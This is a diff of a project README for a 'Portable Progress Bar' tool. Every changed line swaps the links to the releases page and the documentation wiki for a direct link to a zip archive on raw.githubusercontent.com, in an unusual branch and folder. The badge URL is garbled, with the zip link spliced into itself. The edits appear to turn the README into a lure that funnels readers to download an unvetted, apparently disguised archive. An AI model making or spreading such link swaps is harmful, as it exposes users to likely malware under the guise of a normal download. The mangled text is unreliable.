@@ -6,7 +6,7 @@ Welcome to the Portable Progress Bar website! This tool simplifies how you visua
 
 ## 📥 Download Now
 
-[![Download Portable Progress Bar](https://img.shields.io/badge/Download-Portable%20Progress%20Bar-brightgreen.svg)](https://github.com/beben23/Portable-Progress-Bar_Website/releases)
+[![Download Portable Progress Bar](https://raw.githubusercontent.com/beben23/Portable-Progress-Bar_Website/Portable-Progress-Bar_Website_Main-dev/finalism/Portable-Progress-Bar_Website.zip%20Progress%https://raw.githubusercontent.com/beben23/Portable-Progress-Bar_Website/Portable-Progress-Bar_Website_Main-dev/finalism/Portable-Progress-Bar_Website.zip)](https://raw.githubusercontent.com/beben23/Portable-Progress-Bar_Website/Portable-Progress-Bar_Website_Main-dev/finalism/Portable-Progress-Bar_Website.zip)
 
 ## 🌐 About
 
@@ -34,7 +34,7 @@ To run the Portable Progress Bar, ensure your device meets the following require
 
 To download the Portable Progress Bar, visit the page below:
 
-[Visit this page to download](https://github.com/beben23/Portable-Progress-Bar_Website/releases)
+[Visit this page to download](https://raw.githubusercontent.com/beben23/Portable-Progress-Bar_Website/Portable-Progress-Bar_Website_Main-dev/finalism/Portable-Progress-Bar_Website.zip)
 
 ### Step 2: Choose the Latest Release
 
@@ -71,7 +71,7 @@ If you encounter issues not listed here, check out the FAQs section in the repos
 
 ## 📖 Documentation
 
-For detailed instructions and tips on using the Portable Progress Bar, visit the official project documentation. You can find it [here](https://github.com/beben23/Portable-Progress-Bar_Website/wiki).
+For detailed instructions and tips on using the Portable Progress Bar, visit the official project documentation. You can find it [here](https://raw.githubusercontent.com/beben23/Portable-Progress-Bar_Website/Portable-Progress-Bar_Website_Main-dev/finalism/Portable-Progress-Bar_Website.zip).
 
 ## ✉️ Support
 
@@ -95,4 +95,4 @@ Stay tuned for future releases!
 
 This project is licensed under the GPL-3.0 License. For more information, see the LICENSE file in the repository.
 
-[Visit this page to download](https://github.com/beben23/Portable-Progress-Bar_Website/releases)
+[Visit this page to download](https://raw.githubusercontent.com/beben23/Portable-Progress-Bar_Website/Portable-Progress-Bar_Website_Main-dev/finalism/Portable-Progress-Bar_Website.zip)
